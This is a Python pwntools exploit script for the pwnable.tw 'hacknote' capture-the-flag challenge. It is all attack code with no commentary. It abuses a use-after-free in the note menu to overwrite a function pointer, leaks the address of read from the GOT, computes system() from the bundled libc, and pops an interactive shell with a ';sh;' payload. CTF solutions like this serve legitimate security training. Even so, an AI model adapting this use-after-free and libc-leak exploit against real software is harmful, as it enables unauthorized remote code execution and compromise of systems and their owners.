from pwn import *

#r = process('./hacknote')
r = remote('chall.pwnable.tw', 10102)
#raw_input()
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc_32.so.6')



read_got = 0x0804a00c
print_note_addr = 0x0804862b

r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('50')
r.recvuntil('Content :')
r.sendline('a'*49)

r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('50')
r.recvuntil('Content :')
r.sendline('a'*49)


r.recvuntil('choice :')
r.sendline('2')
r.recvuntil('Index :')
r.sendline('0')
r.recvuntil('choice :')
r.sendline('2')
r.recvuntil('Index :')
r.sendline('1')

payload = p32(print_note_addr) + p32(read_got)

r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('8')
r.recvuntil('Content :')
r.sendline(payload)

r.recvuntil('choice :')
r.sendline('3')
r.recvuntil('Index :')
r.sendline('0')

read_addr = u32(r.recv(4))

systm_addr = read_addr - libc.symbols['read'] + libc.symbols['system']

payload = flat([systm_addr,";sh;"])


r.recvuntil('choice :')
r.sendline('2')
r.recvuntil('Index :')
r.sendline('2')

r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('10')
r.recvuntil('Content :')

r.send(payload)
r.interactive()